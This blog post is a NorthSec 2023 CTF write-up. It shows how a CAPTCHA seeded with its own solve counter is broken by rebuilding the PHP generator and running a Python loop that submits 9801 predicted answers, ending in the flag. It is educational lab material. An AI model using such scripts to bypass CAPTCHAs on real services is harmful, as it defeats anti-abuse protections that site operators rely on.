---
layout: post
title: NorthSec 2023 Writeup - I Got 99^2 Problems
date: 2023-05-22
type: post
tags:
- Writeup
- Hacking
- NorthSec
- CTF
permalink: /2023/05/NorthSec/IGot992Problems
img: 2023/05/NorthSec/IGot992Problems/Description.png
---

This challenge was about solving a CAPTCHA that used a predicable value to seed its randomness.

```
Anti-robot captcha to validate. 99^2 valid tries to pass it.

http://igot992problems.ctf 
```

I opened the provided link. 

![CAPTCHA](/assets/images/2023/05/NorthSec/IGot992Problems/Captchat.png "CAPTCHA")

It was simple page with only a CAPTCHA. According to the challenge name, I had to solve it 99^2 (9801) times.

I looked around the page source and found out the PHP code to generate the CAPTCHA text in a comment of a JS file.

![Code to be removed](/assets/images/2023/05/NorthSec/IGot992Problems/CodeToBeRemoved.png "Code to be removed")

This code was generating a random string to use in the CAPTCHA image. It was using the counter of successfully solved CAPTCHA to [seed the random number generator](https://www.php.net/srand). That made it predicable. I could easily write a script that would increment a local counter, generate the CAPTCHA string and submit it.

I copied the PHP code in a file.

```php
<?php
$counter = (int) $argv[1];
srand($counter);
$string='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefhijklmnopqrstuvwxyz1234567890';
$string_shuff=str_shuffle($string);
$text=substr($string_shuff,0,10);

echo $text;
```

Then I wrote a Python script that would call the PHP script to generate the value and submit it.

```python
#!/usr/bin/env python3

import requests;
import os;

url = "http://igot992problems.ctf"
cookies = {
    "PHPSESSID": "57dcc5aeu06gpgf0ncp6683tvn"
}


counter = 0

while True:
    command = f"php gen.php {counter}"
    output_stream = os.popen(command)
    captcha = output_stream.read()
    print(f"{counter} - {captcha}")

    response = requests.get(url + "/captcha-generator/img_gen.php", cookies=cookies)

    data = {
        "value": captcha
    }

    response = requests.post(url, data, cookies=cookies)
    if 'FLAG-' in response.text:
        print('Pwned')
        print(response.text)
        exit()

    if 'Valid Captcha' not in response.text:
        print('Errored out')
        print(response.text)
        exit()
    
    counter += 1
```

I ran the script, and waited for the flag.

```bash
$ ./igot992problem.py
0 - AiEfbC3unc   
1 - 4rcsj5CkLR   
2 - SKeHcF4EOY   
3 - 64P3MvKYlw   
4 - Ik36HYcaRP   
5 - qyGVUkDp0t   
6 - iaY4cS8hKe   

...

9793 - k6xLQeKoWN
9794 - AMLpcZQyVw
9795 - hsxEd30iVq
9796 - 4zyEPVwBO3
9797 - JSepQaTtoP
9798 - M413DVKvCP
9799 - k123mFtWhe
9800 - YzktB8n1sV
Pwned
<p>Valid Captcha. </p><p>Solved 9801 Captcha. </p><p>Congratulations ! FLAG-5911a8911ad6c93a98f46bd63b8ee808</p>
<style>
body {
        background-color: #008080;
}

p {
        background-color: white;
}

</style>

<!DOCTYPE html>
<html lang="en" dir="ltr">
<link rel="stylesheet" href="./captcha-generator/asset/style.css">
  <head>
    <meta charset="utf-8">
    <title>I got 99^2 problems</title>
  </head>
  <body>
  <div>
  <div id="ae_captcha_api"></div>
  </br>
    <form method = "POST" >

                <div><input type="text" placeholder = "Enter Captcha" name="value"/></div>
                <div><input type="submit" formaction="" value = "Submit"/></div>
        </form>
        <script src="./captcha-generator/asset/main.js"></script>
  </div>
  </body>
</html>
```

![Flag](/assets/images/2023/05/NorthSec/IGot992Problems/Flag.png "Flag")